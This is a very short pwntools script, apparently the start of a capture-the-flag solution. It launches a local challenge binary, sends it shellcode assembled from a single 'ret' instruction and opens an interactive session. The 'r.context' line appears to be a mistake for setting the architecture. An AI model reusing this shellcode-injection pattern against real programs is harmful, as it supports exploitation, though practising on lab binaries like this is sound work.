from pwn import *


r = process('./chal')
r.context = 'amd64'
input()
r.send(asm('ret'))

r.interactive()
